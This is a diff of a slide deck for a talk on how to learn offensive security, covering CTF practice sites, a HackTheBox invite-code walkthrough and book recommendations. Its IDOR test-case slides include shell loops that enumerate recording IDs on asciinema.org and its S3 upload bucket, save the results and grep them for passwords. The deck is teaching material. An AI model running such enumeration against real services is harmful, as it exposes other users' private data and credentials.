@@ -17,9 +17,10 @@ class: center, middle, inverse
 ---
 .left-column[
 # Different Learning Styles
-]
 
-.right-column[
+------
+
+
 ## Test Case: IDOR on asciinema.org
 ]
 
@@ -43,27 +44,19 @@ If I get absolutely stuck, I come here
 
 --
 .right-column[
+### Practical Application First?
+Locate from where asciinema pulls the playback information and locate sensitive data
+]
+
+--
+.right-column[
 ### Basics First?
 ]
 
 --
 .right-column[
 * RFC 2616  -  Hypertext Transfer Protocol
-* [REST] Roy Fielding's dissertation "Architectural Styles and the Design of Network-based Software Architectures" 
-]
-
---
-.right-column[
-### Practical Application First?
-]
-
---
-.right-column[
-```sh
-for id in $(seq 1000 9999); do 
-  curl -sL https://asciinema.org/i/${id} >> dump.loot
-done
-```
+* [REST] Roy Fielding's dissertation "Architectural Styles and the Design of Network-based Software Architectures"
 ]
 
 --
@@ -71,6 +64,22 @@ done
 ### Answer First?
 ]
 
+--
+.right-column[
+```sh
+base='https://asciinema-bb-eu.s3-eu-west-1.amazonaws.com'
+endpoint='/uploads/asciicast/file/_/ascii.cast'
+key='?AWSAccessKeyId=xxxx'
+for id in $(seq 10000 99999); do
+  uri="${base}${endpoint/_/$id}${key}"
+  curl -sL $uri >> dump.loot
+done
+
+grep passw dump.loot
+```
+]
+
+--
 ---
 class: center, middle
 ## Learn Skills, Not 'Hacking'
@@ -106,25 +115,27 @@ a.k.a `man $tool` and `--help` all the things!
 ---
 class: center, middle, inverse
 # Deliberate Practice
+
 ---
+
 # Vulnhub.com
 
 --
-  - Use the Walkthroughs
-  - Resist the feeling that it's 'cheating'
 
-???
-- Start with walkthroughs as intruction manuals
-- After 2-4, try alone
-- Creep scroll just enough to get unstuck
+- Use the Walkthroughs
+- Resist the feeling that it's 'cheating'
 
 --
 
 # Find Ongoing CTFs
-  - HackTheBox.eu
-  - CTF Archives
 
----
+--
+
+- HackTheBox.eu
+- CTF Archives
+
+--
+
 # Social Learning
 
 --
@@ -135,6 +146,11 @@ class: center, middle, inverse
   - Meetup.com
   - NetSecFocus Mattermost - chat.netsecfocus.com
   - DC201 or other local DefCon groups
+
+???
+- Start with walkthroughs as intruction manuals
+- After 2-4, try alone
+- Creep scroll just enough to get unstuck
 
 ---
 class: center, middle, inverse
@@ -186,7 +202,6 @@ class: center, middle, inverse
 
 ---
 # Explain it
-
 After inspecting the network traffic, some obfuscated code was found.
 
 The code brought our attention to a function in the global scope, `makeInviteCode()`
@@ -200,12 +215,16 @@ invite code.
 
 # How Else Can We Solve it?
 
+--
+
 * Use BURPSuite to see calls that are made
 * Manually inspect all non-standard globally define functions
 
 --
 
 # What If We Can't Use Postman?
+
+--
 
 * BURPsuite
 * curl
@@ -225,7 +244,7 @@ class: middle
 4    | tr -d '"' \       # delete all instances of the "
 5    | base64 -d         # decode base64
 
-#> In order to generate the invite code, 
+#> In order to generate the invite code,
 #> make a POST request to /api/invite/generate%
 
 
@@ -273,34 +292,34 @@ class: middle
 # Topics
 ]
 .right-column[
-**Reverse Engineering** - Practical Reverse Engineering
+##**Reverse Engineering** - _Practical Reverse Engineering_
 ]
 --
 .right-column[
-**Scripting** - Violent Python
+##**Scripting** - _Violent Python_
 ]
 --
 
 .right-column[
-**Web** - Web Application Hackers Handbook
-]
-
---
-
-.right-column[
-**Crypto** - Applied Cryptography
+##**Web** - _Web Application Hackers Handbook_
 ]
 
 --
 
 .right-column[
-**Binary Exploitation** - Hacking: The Art of Exploitation
+##**Crypto** - _Applied Cryptography_
 ]
 
 --
 
 .right-column[
-**All-In-One** - https://trailofbits.github.io/ctf/
+##**Binary Exploitation** - _Hacking: The Art of Exploitation_
+]
+
+--
+
+.right-column[
+##**All-In-One** - https://trailofbits.github.io/ctf/
 ]
 ---
 class: center, inverse, middle
